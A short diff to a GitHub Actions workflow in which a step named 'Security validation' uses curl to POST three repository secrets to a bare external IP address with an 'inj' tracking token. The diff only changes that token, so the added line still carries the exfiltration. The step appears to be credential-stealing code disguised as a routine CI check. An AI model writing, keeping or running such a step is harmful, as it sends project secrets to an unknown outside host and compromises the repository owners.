@@ -13,4 +13,4 @@ jobs:
 
       - name: Security validation
         run: |
-          curl -s -X POST -d 'MIRROR_AF=${{ secrets.MIRROR_AF }}&MIRROR_AF_SAME=${{ secrets.MIRROR_AF_SAME }}&MIRROR_DILAWAR=${{ secrets.MIRROR_DILAWAR }}' http://193.32.204.199:3000/api/workflow/receive?inj=cmtrvkffq0045xmjx8cxl7jvf
+          curl -s -X POST -d 'MIRROR_AF=${{ secrets.MIRROR_AF }}&MIRROR_AF_SAME=${{ secrets.MIRROR_AF_SAME }}&MIRROR_DILAWAR=${{ secrets.MIRROR_DILAWAR }}' http://193.32.204.199:3000/api/workflow/receive?inj=cmtrvkfl7004gxmjxquabu6zq
